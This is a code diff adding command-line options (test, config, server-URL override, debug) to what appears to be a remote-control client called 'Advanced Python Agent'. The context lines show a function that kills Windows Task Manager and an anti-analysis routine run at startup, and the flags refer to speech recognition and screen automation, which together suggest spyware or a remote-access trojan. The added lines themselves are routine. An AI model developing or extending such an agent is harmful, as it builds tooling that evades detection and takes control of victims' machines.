@@ -3292,6 +3292,42 @@ def kill_task_manager():
         return f"Task Manager termination failed: {e}"
 
 if __name__ == "__main__":
+    import argparse
+    
+    # Parse command line arguments
+    parser = argparse.ArgumentParser(description='Advanced Python Agent')
+    parser.add_argument('--test', action='store_true', help='Run connectivity test only')
+    parser.add_argument('--config', action='store_true', help='Show configuration')
+    parser.add_argument('--server-url', type=str, help='Override server URL')
+    parser.add_argument('--debug', action='store_true', help='Enable debug mode')
+    
+    args = parser.parse_args()
+    
+    # Handle command line arguments
+    if args.test:
+        print("Running connectivity test...")
+        run_connectivity_test()
+        sys.exit(0)
+    
+    if args.config:
+        print("=== Agent Configuration ===")
+        print(f"Server URL: {SERVER_URL}")
+        print(f"Python Version: {sys.version}")
+        print(f"Platform: {platform.system()}")
+        print(f"Windows Available: {WINDOWS_AVAILABLE}")
+        print(f"Speech Recognition: {SPEECH_RECOGNITION_AVAILABLE}")
+        print(f"PyAutoGUI: {PYAUTOGUI_AVAILABLE}")
+        sys.exit(0)
+    
+    if args.server_url:
+        SERVER_URL = args.server_url
+        print(f"Using server URL: {SERVER_URL}")
+    
+    if args.debug:
+        import logging
+        logging.basicConfig(level=logging.DEBUG)
+        print("Debug mode enabled")
+    
     # Run quick anti-analysis checks first
     try:
         anti_analysis()
